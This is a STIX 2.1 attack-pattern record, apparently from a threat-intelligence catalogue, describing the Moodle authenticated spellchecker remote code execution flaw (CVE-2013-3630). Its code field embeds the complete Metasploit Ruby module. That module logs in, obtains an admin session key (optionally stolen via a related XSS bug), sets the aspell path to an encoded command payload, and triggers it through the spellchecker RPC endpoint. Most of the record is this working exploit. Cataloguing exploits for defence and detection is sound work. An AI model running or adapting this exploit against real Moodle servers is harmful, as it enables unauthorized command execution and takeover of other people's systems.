{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7f958a92-b095-4564-b3c6-0b96e64c6280",
    "created": "2024-08-14T17:10:09.716588Z",
    "modified": "2024-08-14T17:10:09.716592Z",
    "name": "Moodle Authenticated Spelling Binary RCE",
    "description": " Moodle allows an authenticated user to define spellcheck settings via the web interface. The user can update the spellcheck mechanism to point to a system-installed aspell binary. By updating the path for the spellchecker to an arbitrary command, an attacker can run arbitrary commands in the context of the web application upon spellchecking requests.  This module also allows an attacker to leverage another privilege escalation vuln. Using the referenced XSS vuln, an unprivileged authenticated user can steal an admin sesskey and use this to escalate privileges to that of an admin, allowing the module to pop a shell as a previously unprivileged authenticated user.  This module was tested against Moodle version 2.5.2 and 2.2.3.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/moodle_spelling_binary_rce.rb",
            "external_id": "moodle_spelling_binary_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-3630"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2013/10/30/seven-tricks-and-treats"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rexml/document'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HTTP::Moodle\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Moodle Authenticated Spelling Binary RCE',\n        'Description' => %q{\n          Moodle allows an authenticated user to define spellcheck settings via the web interface.\n          The user can update the spellcheck mechanism to point to a system-installed aspell binary.\n          By updating the path for the spellchecker to an arbitrary command, an attacker can run\n          arbitrary commands in the context of the web application upon spellchecking requests.\n\n          This module also allows an attacker to leverage another privilege escalation vuln.\n          Using the referenced XSS vuln, an unprivileged authenticated user can steal an admin sesskey\n          and use this to escalate privileges to that of an admin, allowing the module to pop a shell\n          as a previously unprivileged authenticated user.\n\n          This module was tested against Moodle version 2.5.2 and 2.2.3.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Brandon Perry <bperry.volatile[at]gmail.com>' # Discovery / msf module\n        ],\n        'References' => [\n          ['CVE', '2013-3630'],\n          ['CVE', '2013-4341'], # XSS\n          ['EDB', '28174'], # xss vuln allowing sesskey of admins to be stolen\n          ['URL', 'https://www.rapid7.com/blog/post/2013/10/30/seven-tricks-and-treats']\n        ],\n        'Payload' => {\n          'Compat' =>\n                {\n                  'PayloadType' => 'cmd',\n                  'RequiredCmd' => 'generic perl ruby telnet python'\n                }\n        },\n        'Platform' => ['unix', 'linux'],\n        'Arch' => ARCH_CMD,\n        'Targets' => [['Automatic', {}]],\n        'DisclosureDate' => '2013-10-30',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [CONFIG_CHANGES, IOC_IN_LOGS]\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('USERNAME', [ true, 'Username to authenticate with', 'admin']),\n        OptString.new('PASSWORD', [ true, 'Password to authenticate with', '']),\n        OptString.new('SESSKEY', [ false, 'The session key of the user to impersonate', '']),\n        OptString.new('TARGETURI', [ true, 'The URI of the Moodle installation', '/moodle/'])\n      ]\n    )\n  end\n\n  def check\n    return CheckCode::Unknown('No web server or moodle instance found') unless moodle_and_online?\n\n    v = moodle_version\n    return CheckCode::Detected('Unable to determine moodle version') if v.nil?\n    if Rex::Version.new(v) <= Rex::Version.new('2.5.2')\n      return CheckCode::Appears(\"Exploitable Moodle version #{v} detected\")\n    end\n\n    CheckCode::Safe(\"Non-exploitable Moodle version #{v} detected\")\n  end\n\n  def exploit\n    init = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'index.php'),\n      'keep_cookies' => true\n    })\n\n    fail_with(Failure::Unreachable, 'No response received from the target.') unless init\n\n    print_status('Authenticating as user: ' << datastore['USERNAME'])\n\n    # don't use the lib version of the login since this is older and has different parameters\n    login = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'login', 'index.php'),\n      'vars_post' => {\n        'username' => datastore['USERNAME'],\n        'password' => datastore['PASSWORD']\n      },\n      'keep_cookies' => true\n    })\n\n    if !login || (login.code != 303)\n      fail_with(Failure::NoAccess, 'Login failed')\n    end\n\n    print_status('Getting session key to update spellchecker if no session key was specified')\n\n    sesskey = ''\n    if datastore['SESSKEY'] == ''\n      tinymce = send_request_cgi({\n        'uri' => normalize_uri(target_uri.path, 'admin', 'settings.php'),\n        'vars_get' => {\n          'section' => 'editorsettingstinymce'\n        },\n        'keep_cookies' => true\n      })\n\n      sesskey = tinymce.get_hidden_inputs[1]['sesskey']\n      unless sesskey\n        fail_with(Failure::UnexpectedReply, 'Unable to get proper session key')\n      end\n    else\n      sesskey = datastore['SESSKEY']\n    end\n\n    # This looks unused, and in CVE-2021-21809 we set this as well, going to leave it here for the\n    # time being since it may be the default, or it may just need a send_request_cgi added to actually\n    # accomplish the goal.\n    # post = {\n    #  'section' => 'editorsettingstinymce',\n    #  'sesskey' => sesskey,\n    #  'return' => '',\n    #  's_editor_tinymce_spellengine' => 'PSpellShell',\n    #  's_editor_tinymce_spelllanguagelist' => '%2BEnglish%3Den%2CDanish%3Dda%2CDutch%3Dnl%2CFinnish%3Dfi%2CFrench%3Dfr%2CGerman%3Dde%2CItalian%3Dit%2CPolish%3Dpl%2CPortuguese%3Dpt%2CSpanish%3Des%2CSwedish%3Dsv'\n    # }\n\n    print_status('Updating spellchecker to use the system aspell')\n\n    send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/admin/settings.php'),\n      'vars_post' => {\n        'section' => 'systempaths',\n        'sesskey' => sesskey,\n        'return' => '',\n        's__gdversion' => '2',\n        's__pathtodu' => '/usr/bin/du',\n        's__aspellpath' => payload.encoded,\n        's__pathtodot' => ''\n      },\n      'keep_cookies' => true\n    })\n\n    spellcheck = '{\"id\":\"c0\",\"method\":\"checkWords\",\"params\":[\"en\",[\"\"]]}'\n\n    print_status('Triggering payload')\n\n    resp = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'lib', 'editor', 'tinymce', 'tiny_mce', '3.4.9', 'plugins', 'spellchecker', 'rpc.php'),\n      'data' => spellcheck,\n      'ctype' => 'application/json',\n      'keep_cookies' => true\n    })\n\n    if !resp || (resp.code != 200)\n      fail_with(Failure::PayloadFailed, 'Error triggering payload')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-10-30",
    "x_mitre_platforms": [
        "['unix', 'linux']"
    ]
}